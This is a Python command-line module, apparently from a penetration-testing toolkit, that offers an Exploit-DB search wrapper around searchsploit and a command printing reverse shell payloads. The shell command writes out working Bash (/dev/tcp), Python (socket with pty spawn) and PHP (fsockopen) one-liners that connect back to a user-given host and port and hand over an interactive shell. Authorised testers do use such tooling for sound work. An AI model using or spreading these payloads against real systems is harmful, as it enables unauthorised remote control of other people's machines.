import click
from rich.console import Console
from .config import get_workspace_path
from .utils import run_external_tool

console = Console()

@click.group()
def exploit():
    """Exploitation and PoC Helpers."""
    pass

@exploit.command()
@click.option("--search", required=True, help="Search term for exploit discovery (e.g., 'wordpress 6.2').")
def search(search):
    """
    Searches Exploit-DB using searchsploit.
    """
    console.print(f"[bold]Searching Exploit-DB for: {search}...[/bold]")
    
    tool_path = "searchsploit"
    
    args = [
        search,
    ]
    
    # searchsploit is a local tool, no target or workspace needed for this command
    run_external_tool(
        tool_path=tool_path,
        args=args,
        target="local",
        workspace_path=get_workspace_path("local_search"),
        output_filename=None,
        check_scope=False,
        is_intrusive=False,
        confirm_execute=False,
    )

@exploit.command()
@click.option("--reverse", is_flag=True, help="Generate a reverse shell payload.")
@click.option("--lhost", help="Local host IP for reverse shell.")
@click.option("--lport", help="Local port for reverse shell.")
def shell(reverse, lhost, lport):
    """
    Generates common reverse shell payloads.
    """
    if reverse and lhost and lport:
        console.print(f"[bold yellow]Generating reverse shell payload to {lhost}:{lport}...[/bold yellow]")
        
        payloads = {
            "Bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "Python": f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            "PHP": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        }
        
        console.print("\n[bold cyan]--- Reverse Shell Payloads ---[/bold cyan]")
        for name, payload in payloads.items():
            console.print(f"[bold]{name}:[/bold] {payload}")
        console.print("[bold cyan]------------------------------[/bold cyan]\n")
    else:
        console.print("[bold red]Error:[/bold red] Must specify --reverse, --lhost, and --lport for shell generation.")

if __name__ == '__main__':
    exploit()
